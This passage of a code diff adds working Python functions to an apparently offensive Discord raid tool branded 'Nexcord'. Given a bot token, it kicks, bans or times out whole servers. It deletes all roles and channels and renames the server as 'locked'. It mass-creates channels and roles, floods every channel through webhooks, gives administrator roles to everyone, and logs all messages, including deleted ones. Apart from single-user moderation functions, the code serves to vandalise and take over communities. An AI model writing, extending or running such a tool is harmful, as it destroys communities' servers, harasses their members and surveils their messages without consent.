+                    await asyncio.sleep(1)
+                    
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+            finally:
+                await bot.close()
+
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def kick_user_tool():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Kick User ]\n" + RESET)
+        
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+        USER_ID = int(input(WHITE + "Enter user ID to kick: " + RESET))
+
+        intents = discord.Intents.default()
+        intents.members = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                member = guild.get_member(USER_ID)
+                if not member:
+                    print(RED + "User not found!" + RESET)
+                else:
+                    try:
+                        await member.kick(reason="Kicked via moderation tool")
+                        print(WHITE + f"User {member} was kicked!" + RESET)
+                    except Exception as e:
+                        print(RED + f"Failed to kick user: {e}" + RESET)
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+            finally:
+                await bot.close()
+
+        asyncio.run(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def kick_all_tool():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Kick All Members ]\n" + RESET)
+        
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+        EXCLUDE_IDS = input(WHITE + "Enter user IDs to exclude (comma-separated, e.g., 123,456) or leave empty: " + RESET)
+        exclude_ids = [int(uid.strip()) for uid in EXCLUDE_IDS.split(",") if uid.strip().isdigit()]
+
+        intents = discord.Intents.default()
+        intents.members = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                count = 0
+                for member in guild.members:
+                    if should_exit:
+                        break
+                    if not member.bot and member.id not in exclude_ids and member != guild.me:
+                        try:
+                            await member.kick(reason="Kicked via moderation tool")
+                            count += 1
+                        except:
+                            continue
+                if not should_exit:
+                    print(WHITE + f"Kicked {count} members." + RESET)
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+            finally:
+                await bot.close()
+
+        asyncio.run(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def ban_user_tool():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Ban User ]\n" + RESET)
+        
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+        USER_ID = int(input(WHITE + "Enter user ID to ban: " + RESET))
+
+        intents = discord.Intents.default()
+        intents.members = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                member = guild.get_member(USER_ID)
+                if not member:
+                    print(RED + "User not found!" + RESET)
+                else:
+                    try:
+                        await member.ban(reason="Banned via moderation tool")
+                        print(WHITE + f"User {member} was banned!" + RESET)
+                    except Exception as e:
+                        print(RED + f"Failed to ban user: {e}" + RESET)
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+            finally:
+                await bot.close()
+
+        asyncio.run(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def ban_all_tool():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Ban All Members ]\n" + RESET)
+        
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+        EXCLUDE_IDS = input(WHITE + "Enter user IDs to exclude (comma-separated, e.g., 123,456) or leave empty: " + RESET)
+        exclude_ids = [int(uid.strip()) for uid in EXCLUDE_IDS.split(",") if uid.strip().isdigit()]
+
+        intents = discord.Intents.default()
+        intents.members = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                count = 0
+                for member in guild.members:
+                    if should_exit:
+                        break
+                    if not member.bot and member.id not in exclude_ids and member != guild.me:
+                        try:
+                            await member.ban(reason="Banned via moderation tool")
+                            count += 1
+                        except:
+                            continue
+                if not should_exit:
+                    print(WHITE + f"Banned {count} members." + RESET)
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+            finally:
+                await bot.close()
+
+        asyncio.run(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def timeout_user_tool():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Timeout User ]\n" + RESET)
+        
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+        USER_ID = int(input(WHITE + "Enter user ID to timeout: " + RESET))
+        DURATION = int(input(WHITE + "Enter timeout duration in seconds: " + RESET))
+        REASON = input(WHITE + "Enter reason for timeout: " + RESET)
+
+        intents = discord.Intents.default()
+        intents.members = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                member = guild.get_member(USER_ID)
+                if not member:
+                    print(RED + "User not found!" + RESET)
+                else:
+                    try:
+                        await member.timeout(duration=discord.utils.timedelta(seconds=DURATION), reason=REASON)
+                        print(WHITE + f"User {member} timed out for {DURATION} seconds." + RESET)
+                    except Exception as e:
+                        print(RED + f"Failed to timeout user: {e}" + RESET)
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+            finally:
+                await bot.close()
+
+        asyncio.run(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def timeout_all_tool():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Timeout All Members ]\n" + RESET)
+        
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+        EXCLUDE_IDS = input(WHITE + "Enter user IDs to exclude (comma-separated) or leave empty: " + RESET)
+        exclude_ids = [int(uid.strip()) for uid in EXCLUDE_IDS.split(",") if uid.strip().isdigit()]
+        DURATION = int(input(WHITE + "Enter timeout duration in seconds: " + RESET))
+        REASON = input(WHITE + "Enter reason for timeout: " + RESET)
+
+        intents = discord.Intents.default()
+        intents.members = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                count = 0
+                for member in guild.members:
+                    if should_exit:
+                        break
+                    if not member.bot and member.id not in exclude_ids and member != guild.me:
+                        try:
+                            await member.timeout(duration=discord.utils.timedelta(seconds=DURATION), reason=REASON)
+                            count += 1
+                        except:
+                            continue
+                if not should_exit:
+                    print(WHITE + f"Timed out {count} members for {DURATION} seconds." + RESET)
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+            finally:
+                await bot.close()
+
+        asyncio.run(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def message_logger_tool():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Message Logger - prints all messages with details ]\n" + RESET)
+        
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+        
+        intents = discord.Intents.all()   
+        bot = commands.Bot(command_prefix="!", intents=intents)
+        
+        import re
+
+        url_pattern = re.compile(r'https?://\S+')
+
+        def log_message(event_type, message):
+            category = message.channel.category.name if message.channel.category else "No Category"
+            content = message.content if message.content else ""
+            links = url_pattern.findall(content)
+            attachments = [att.url for att in message.attachments]
+            
+            print(f"[{datetime.now()}] {event_type}")
+            print(f"Author   : {message.author}")
+            print(f"Category : {category}")
+            print(f"Channel  : {message.channel.name}")
+            if content:
+                print(f"Message  : {content}")
+            if links:
+                print(f"Links    : {', '.join(links)}")
+            if attachments:
+                print(f"Attachments : {', '.join(attachments)}")
+
+        @bot.event
+        async def on_ready():
+            print(WHITE + f"Bot ready! Logging all messages for guild ID {GUILD_ID}..." + RESET)
+
+        @bot.event
+        async def on_message(message):
+            if should_exit:
+                return
+            if message.guild and message.guild.id == GUILD_ID:
+                log_message("Sent", message)
+            await bot.process_commands(message)
+
+        @bot.event
+        async def on_message_delete(message):
+            if should_exit:
+                return
+            if message.guild and message.guild.id == GUILD_ID:
+                log_message("Deleted", message)
+
+        bot.run(TOKEN)
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def server_logger_tool():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Discord Full Server Logger Tool ]\n" + RESET)
+
+        TOKEN = input(WHITE + "Enter your Bot Token: " + RESET).strip()
+        
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        SERVER_ID = int(input(WHITE + "Enter the Server ID to log: " + RESET).strip())
+
+        intents = discord.Intents.all()
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            guild = bot.get_guild(SERVER_ID)
+            if not guild:
+                print(RED + "Bot is not in the server with this ID!" + RESET)
+                return
+            print(WHITE + f"{bot.user} is online and logging server: {guild.name}" + RESET)
+
+        @bot.event
+        async def on_message(message):
+            if should_exit:
+                return
+            if message.author.bot or message.guild.id != SERVER_ID:
+                return
+            print(WHITE + f"Message from {message.author} ({message.author.id}): {message.content}" + RESET)
+
+        @bot.event
+        async def on_message_delete(message):
+            if should_exit:
+                return
+            if message.guild.id != SERVER_ID:
+                return
+            content = message.content or "[Attachment or embed]"
+            print(WHITE + f"Message Deleted from {message.author} ({message.author.id}): {content}" + RESET)
+
+        bot.run(TOKEN)
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def server_lock_tool():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Server Lock Tool ]\n" + RESET)
+        
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+        new_server_name = input(WHITE + "Enter new server name: " + RESET).strip() or "LOCKED BY NEXCORD"
+        category_name = input(WHITE + "Enter category name: " + RESET).strip() or "SERVER LOCKED"
+        channel_name = input(WHITE + "Enter channel name: " + RESET).strip() or "nexcord-on-top"
+        role_name = input(WHITE + "Enter admin role name: " + RESET).strip() or "NEXCORD OWNER"
+        lock_message = input(WHITE + "Enter lock message: " + RESET).strip() or "SERVER LOCKED BY NEXCORD"
+
+        
+        allow_send = input(WHITE + "Allow members to send messages? (y/n): " + RESET).strip().lower() == 'y'
+        allow_react = input(WHITE + "Allow members to add reactions? (y/n): " + RESET).strip().lower() == 'y'
+
+        
+        assign_option = input(WHITE + "Assign role to: (1) All members (2) Specific users: " + RESET).strip()
+        
+        user_ids = []
+        if assign_option == "2":
+            users_input = input(WHITE + "Enter user IDs (separated by space or comma): " + RESET).strip()
+            for uid in users_input.replace(',', ' ').split():
+                if uid.strip().isdigit():
+                    user_ids.append(int(uid.strip()))
+
+        confirm = input(WHITE + f"Type 'CONFIRM' to lock server: " + RESET).strip()
+        if confirm.upper() != "CONFIRM":
+            print(RED + "Operation cancelled." + RESET)
+            return_to_menu()
+            return
+
+        intents = discord.Intents.default()
+        intents.guilds = True
+        intents.members = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                if not guild:
+                    print(RED + "Server not found!" + RESET)
+                    await bot.close()
+                    return
+
+                
+                try:
+                    await guild.edit(name=new_server_name)
+                    print(WHITE + f"Server name changed to: {new_server_name}" + RESET)
+                except:
+                    print(RED + "Failed to change server name!" + RESET)
+                
+                
+                print(WHITE + "Deleting deletable roles..." + RESET)
+                for role in guild.roles:
+                    if should_exit:
+                        break
+                    try:
+                        if role.name != "@everyone" and role < guild.me.top_role and not role.managed:
+                            await role.delete()
+                    except:
+                        continue  
+                
+                
+                try:
+                    admin_role = await guild.create_role(
+                        name=role_name,
+                        permissions=discord.Permissions(administrator=True),
+                        colour=discord.Colour.red()
+                    )
+                    
+                    await admin_role.edit(position=guild.me.top_role.position - 1)
+                    print(WHITE + f"Created role: {role_name} under bot position" + RESET)
+                    
+                    
+                    success_count = 0
+                    fail_count = 0
+                    
+                    if assign_option == "1":  
+                        for member in guild.members:
+                            if should_exit:
+                                break
+                            try:
+                                await member.add_roles(admin_role)
+                                success_count += 1
+                                print(WHITE + f"Added role to: {member}" + RESET)
+                            except:
+                                fail_count += 1
+                                continue  
+                    else:  
+                        for user_id in user_ids:
+                            if should_exit:
+                                break
+                            member = guild.get_member(user_id)
+                            if member:
+                                try:
+                                    await member.add_roles(admin_role)
+                                    success_count += 1
+                                    print(WHITE + f"Added role to: {member}" + RESET)
+                                except:
+                                    fail_count += 1
+                                    print(RED + f"Failed to add role to user {user_id}" + RESET)
+                            else:
+                                fail_count += 1
+                                print(RED + f"User {user_id} not found" + RESET)
+                    
+                    print(WHITE + f"Role assignment: {success_count} successful, {fail_count} failed" + RESET)
+                        
+                except Exception as e:
+                    print(RED + f"Failed to create role: {e}" + RESET)
+                
+                
+                print(WHITE + "Deleting channels..." + RESET)
+                for channel in list(guild.channels):
+                    if should_exit:
+                        break
+                    try:
+                        await channel.delete()
+                    except:
+                        continue  
+                
+                
+                overwrites = {
+                    guild.default_role: discord.PermissionOverwrite(
+                        read_messages=True,
+                        send_messages=allow_send,
+                        add_reactions=allow_react,
+                        connect=False,
+                        speak=False
+                    ),
+                    guild.me: discord.PermissionOverwrite(
+                        read_messages=True,
+                        send_messages=True,
+                        manage_messages=True,
+                        manage_channels=True
+                    )
+                }
+                
+                category = await guild.create_category(category_name, overwrites=overwrites)
+                text_channel = await guild.create_text_channel(channel_name, category=category, overwrites=overwrites)
+                
+                
+                await text_channel.send(lock_message)
+                print(WHITE + "Server locked successfully!" + RESET)
+                print(WHITE + f"Members can send messages: {allow_send}" + RESET)
+                print(WHITE + f"Members can add reactions: {allow_react}" + RESET)
+                
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+            finally:
+                await bot.close()
+
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def mass_channel_creator():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Mass Channel Creator ]\n" + RESET)
+        
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+        CHANNEL_COUNT = int(input(WHITE + "How many channels to create? " + RESET))
+
+        print(RED + "\nPress Ctrl+C at any time to cancel and return to main menu..." + RESET)
+
+        intents = discord.Intents.default()
+        intents.guilds = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                if not guild:
+                    print(RED + "Guild not found!" + RESET)
+                    await bot.close()
+                    return
+
+                created = 0
+                for i in range(CHANNEL_COUNT):
+                    if should_exit:
+                        break
+                    try:
+                        await guild.create_text_channel(f"nexcord-{i+1}")
+                        created += 1
+                        print(WHITE + f"Created channel {i+1}/{CHANNEL_COUNT}" + RESET)
+                    except:
+                        print(RED + f"Failed to create channel {i+1}" + RESET)
+                
+                if not should_exit:
+                    print(WHITE + f"Successfully created {created} channels!" + RESET)
+                    
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+            finally:
+                await bot.close()
+
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def mass_role_creator():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Mass Role Creator ]\n" + RESET)
+        
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+        ROLE_COUNT = int(input(WHITE + "How many roles to create? " + RESET))
+
+        print(RED + "\nPress Ctrl+C at any time to cancel and return to main menu..." + RESET)
+
+        intents = discord.Intents.default()
+        intents.guilds = True
+        intents.members = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                if not guild:
+                    print(RED + "Guild not found!" + RESET)
+                    await bot.close()
+                    return
+
+                created = 0
+                for i in range(ROLE_COUNT):
+                    if should_exit:
+                        break
+                    try:
+                        color = discord.Colour(random.randint(0, 0xFFFFFF))
+                        await guild.create_role(name=f"Nexcord daddy {i+1}", color=color)
+                        created += 1
+                        print(WHITE + f"Created role {i+1}/{ROLE_COUNT}" + RESET)
+                    except:
+                        print(RED + f"Failed to create role {i+1}" + RESET)
+                
+                if not should_exit:
+                    print(WHITE + f"Successfully created {created} roles!" + RESET)
+                    
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+            finally:
+                await bot.close()
+
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def webhook_spammer():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Webhook Spammer - Creates webhooks in every channel and uses them to spam. ]\n" + RESET)
+        
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+        MESSAGE = input(WHITE + "Enter message to spam: " + RESET)
+        AMOUNT = int(input(WHITE + "How many times per webhook? " + RESET))
+
+        print(RED + "\nPress Ctrl+C at any time to cancel and return to main menu..." + RESET)
+
+        intents = discord.Intents.default()
+        intents.guilds = True
+        intents.messages = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                if not guild:
+                    print(RED + "Guild not found!" + RESET)
+                    await bot.close()
+                    return
+
+                webhooks = []
+                webhook_count = 0
+                
+                
+                for channel in guild.text_channels:
+                    if should_exit:
+                        break
+                    try:
+                        webhook = await channel.create_webhook(name=f"Nexcord Webhook {webhook_count+1}")
+                        webhooks.append(webhook)
+                        webhook_count += 1
+                        print(WHITE + f"Created webhook in {channel.name}" + RESET)
+                    except:
+                        continue
+                
+                if should_exit:
+                    return
+                
+                print(WHITE + f"\nCreated {webhook_count} webhooks. Starting MASS SPAM..." + RESET)
+                
+                
+                for i in range(AMOUNT):
+                    if should_exit:
+                        break
+                    
+                    
+                    tasks = []
+                    for webhook in webhooks:
+                        if should_exit:
+                            break
+                        task = webhook.send(MESSAGE)
+                        tasks.append(task)
+                    
+                    
+                    if tasks and not should_exit:
+                        results = await asyncio.gather(*tasks, return_exceptions=True)
+                        successful = sum(1 for r in results if not isinstance(r, Exception))
+                        print(WHITE + f"Wave {i+1}/{AMOUNT}: {successful}/{len(webhooks)} webhooks sent successfully" + RESET)
+                    
+                    
+                    if not should_exit and i < AMOUNT - 1:
+                        await asyncio.sleep(0.2)
+                
+                if not should_exit:
+                    total_messages = len(webhooks) * AMOUNT
+                    print(WHITE + f"\nMASS SPAM COMPLETE! Sent {total_messages} messages using {webhook_count} webhooks!" + RESET)
+                    
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+            finally:
+                await bot.close()
+
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def voice_channel_terror():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Mass Create Voice channels ]\n" + RESET)
+        
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+        CHANNEL_COUNT = int(input(WHITE + "How many voice channels to create? " + RESET))
+
+        print(RED + "\nPress Ctrl+C at any time to cancel and return to main menu..." + RESET)
+
+        intents = discord.Intents.default()
+        intents.guilds = True
+        intents.voice_states = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                if not guild:
+                    print(RED + "Guild not found!" + RESET)
+                    await bot.close()
+                    return
+
+                created = 0
+                for i in range(CHANNEL_COUNT):
+                    if should_exit:
+                        break
+                    try:
+                        await guild.create_voice_channel(f"Nexcord {i+1}")
+                        created += 1
+                        print(WHITE + f"Created voice channel {i+1}/{CHANNEL_COUNT}" + RESET)
+                    except:
+                        print(RED + f"Failed to create voice channel {i+1}" + RESET)
+                
+                if not should_exit:
+                    print(WHITE + f"Successfully created {created} voice channels!" + RESET)
+                    
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+            finally:
+                await bot.close()
+
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def role_chaos_maker():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Staff confusion - creates staff roles and gives them to @everyone ]\n" + RESET)
+        
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+
+        print(RED + "\nPress Ctrl+C at any time to cancel and return to main menu..." + RESET)
+
+        intents = discord.Intents.default()
+        intents.guilds = True
+        intents.members = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                if not guild:
+                    print(RED + "Guild not found!" + RESET)
+                    await bot.close()
+                    return
+
+                role_names = ["Server manager", "Server sigma", "Server Developer", "Server bot", "Server Founder", "Server Owner", "Server Admin", "Server Moderator"]
+                created = 0
+                
+                for name in role_names:
+                    if should_exit:
+                        break
+                    for i in range(5):
+                        if should_exit:
+                            break
+                        try:
+                            color = discord.Colour(random.randint(0, 0xFFFFFF))
+                            role = await guild.create_role(name=f"{name} {i+1}", permissions=discord.Permissions(administrator=True), color=color)
+                            created += 1
+                            print(WHITE + f"Created role: {role.name}" + RESET)
+                            
+                            for member in guild.members:
+                                if should_exit:
+                                    break
+                                try:
+                                    await member.add_roles(role)
+                                except:
+                                    continue
+                        except:
+                            print(RED + f"Failed to create role {name} {i+1}" + RESET)
+                
+                if not should_exit:
+                    print(WHITE + f"Successfully created {created} admin roles and assigned to everyone!" + RESET)
+                    
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+            finally:
+                await bot.close()
+
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def move_all_voice_tool():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Move All - moves everybody into one call ]\n" + RESET)
+        
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        
+        if not TOKEN:
+            print(RED + "No bot token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+        TARGET_CHANNEL_ID = int(input(WHITE + "Enter target voice channel ID: " + RESET))
+
+        print(RED + "\nPress Ctrl+C at any time to cancel and return to main menu..." + RESET)
+
+        intents = discord.Intents.default()
+        intents.members = True
+        intents.voice_states = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                if not guild:
+                    print(RED + "Guild not found!" + RESET)
+                    await bot.close()
+                    return
+
+                target_channel = guild.get_channel(TARGET_CHANNEL_ID)
+                if not target_channel or not isinstance(target_channel, discord.VoiceChannel):
+                    print(RED + "Target channel not found or not a voice channel!" + RESET)
+                    await bot.close()
+                    return
+
+                print(WHITE + f"Starting mqass move to {target_channel.name}..." + RESET)
+                
+                moved_count = 0
+                failed_count = 0
+                
+                
+                members_to_move = []
+                for member in guild.members:
+                    if should_exit:
+                        break
+                    if member.voice and member.voice.channel:
+                        members_to_move.append(member)
+                
+                print(WHITE + f"Found {len(members_to_move)} members in voice channels" + RESET)
+                
+                
+                tasks = []
+                for member in members_to_move:
+                    if should_exit:
+                        break
+                    task = member.move_to(target_channel)
+                    tasks.append(task)
+                
+                
+                if tasks and not should_exit:
+                    results = await asyncio.gather(*tasks, return_exceptions=True)
+                    
+                    
+                    for i, result in enumerate(results):
+                        if isinstance(result, Exception):
+                            failed_count += 1
+                            print(RED + f"Failed to move {members_to_move[i]}: {result}" + RESET)
+                        else:
+                            moved_count += 1
+                            print(WHITE + f"Successfully moved {members_to_move[i]}" + RESET)
+                
+                if not should_exit:
+                    print(WHITE + f"\nMOVE COMPLETE! Moved: {moved_count} | Failed: {failed_count}" + RESET)
+                    
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+            finally:
+                await bot.close()
+
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
